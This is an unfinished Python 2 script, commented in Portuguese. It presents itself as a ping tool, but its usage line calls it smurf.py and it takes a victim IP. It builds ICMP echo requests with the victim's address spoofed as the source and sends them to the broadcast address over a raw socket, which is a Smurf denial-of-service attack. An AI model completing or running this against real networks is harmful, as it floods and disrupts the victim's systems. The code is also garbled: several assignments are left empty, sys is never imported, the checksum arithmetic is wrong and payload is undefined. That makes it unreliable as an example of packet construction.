#Envia um pacote ICMP Echo Request para outra maquina

#Exemplo de uso: python ping.py 10.0.0.1

import struct
import socket

# Checksum quebra todo o header em numeros de 2 bytes (unsigned shorts) e 
# soma todos eles entregando como resultado um unsigned short. Se ao final 
# da soma restar algum carry que extrapole os limites do short, este carry 
# eh somado ao resultado como um novo numero. Ao final o resultado eh 
# retornado em complemento de 1 (bits invertidos). Como em python o 
# resultado usa 32 bits, esta inversao retorna um numero fora do escopo de 
# um short (zero ficaria 0xffffffff por exemplo). Para evitar complicacoes, 
# uma operacao and eh usada com uma mascara 0xffff a fim de manter apenas os
# primeiros 16 bits relevantes.
def checksum(header):
  shorts = struct.unpack('!HHHH', header)
  sum = 0
  for n in shorts:
    sum = sum + n
  sum = sum + sum>>16 #se houver carry, soma-o como se fosse um novo numero
  return (~sum) & 0xffff

def mac2bytes(mac):
  bytes = ''
  for c in mac.split(':'):
    bytes = bytes + c.decode('hex')
  return bytes

def string2hexip(sip):
  ns = sip.split('.')
  ns2 = []
  for n in ns:
    ns2.append(int(n))
  return struct.pack('!BBBB', ns2[0], ns2[1], ns2[2], ns2[3])


if len(sys.argv) < 2:
	print "Uso: python smurf.py <IP alvo>"
  exit()

#victim
target_ip = socket.gethostbyname(sys.argv[1])

#ethernet header
source_mac = mac2bytes("a4:1f:72:f5:90:b7") #6B
target_mac = mac2bytes() #6B TODO pegar o mac do roteador
eth_type = #2B

eth_header = 


#ip header
ver_ihl = 0xf0 #1B
tos = 
total_length
source_ip = string2hexip(sys.argv[1]) #4B
target_ip = string2hexip("255.255.255.255") #4B

ip_header = 


#icmp header
type = 8
code = 0
checksum_zero = 0
identifier = 0xffff
sequence = 0x0123
#payload = 'asdf'

true_checksum = checksum(struct.pack('!BBHHH4s', type, code, checksum_zero, identifier, sequence))
print true_checksum
icmp_header = struct.pack('!BBHHH4s', type, code, true_checksum, identifier, sequence, payload)

print "icmp header: " + icmp_header


# Get ICMP code
icmp = socket.getprotobyname("icmp")

# Create a raw socket
try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
except socket.error , msg:
  print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
  sys.exit()

# Send echo request
s.sendto(icmp_header, (target_ip,0))
